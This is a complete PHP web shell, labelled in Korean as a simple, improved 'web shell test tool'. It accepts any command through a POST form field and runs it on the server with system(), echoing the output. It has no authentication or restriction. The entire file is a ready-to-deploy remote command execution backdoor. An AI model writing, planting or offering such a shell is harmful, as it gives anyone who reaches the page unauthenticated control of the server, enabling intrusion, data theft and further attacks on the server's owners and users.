<?php
// 간단한 웹 쉘 코드 (개선 버전)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $command = trim($_POST['cmd']);
    if (!empty($command)) {
        echo "<h3>입력한 명령어: <code>" . htmlspecialchars($command) . "</code></h3>";
        echo "<h4>실행 결과:</h4>";
        echo "<pre style='background: #f4f4f4; padding: 10px; border: 1px solid #ccc;'>";
        // 명령어 실행 및 출력
        system($command);
        echo "</pre>";
    } else {
        echo "<h3 style='color: red;'>명령어를 입력해주세요.</h3>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>웹 쉘 테스트</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background: #f9f9f9; }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            padding: 10px 15px;
            background: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #0056b3;
        }
    </style>
</head>
<body>
    <h1>웹 쉘 테스트 도구</h1>
    <p>명령어를 입력하여 서버의 셸에서 실행하고 결과를 확인하세요.</p>
    <form method="post">
        <input type="text" name="cmd" placeholder="명령어를 입력하세요 (e.g., ls, whoami)" required>
        <button type="submit">명령어 실행</button>
    </form>
</body>
</html>
